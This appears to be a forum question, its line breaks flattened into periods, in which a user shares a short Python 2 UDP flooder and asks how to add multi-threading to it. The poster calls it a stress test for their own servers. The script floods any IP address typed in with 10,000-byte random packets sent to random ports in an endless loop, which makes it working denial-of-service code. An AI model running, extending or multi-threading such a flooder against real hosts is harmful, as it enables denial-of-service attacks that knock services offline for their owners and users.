"implementing multi-threading in a blank script i wanted to create a blank script to stress test my servers..so i created this basic udp flooder and i think i have it working correctly...my question is how would i go about adding multi-threading to this?.i read a manual on blank threading but didn't understand how to actually.implement it into my script. ..import socket.import random..print ""target:"",.ipaddr = raw_input()..sent = 1.bytes = random._urandom(10000).port = 1..while sent &gt; 0:.    print ""test started on"", ipaddr, ""|"", sent, ""packets sent. press ctrl+c to stop."".    sent += 1.s = socket.socket(socket.af_inet, socket.sock_dgram).s.sendto(bytes,(ipaddr,port)).port = random.randint(1, 65500)..raw_input()"
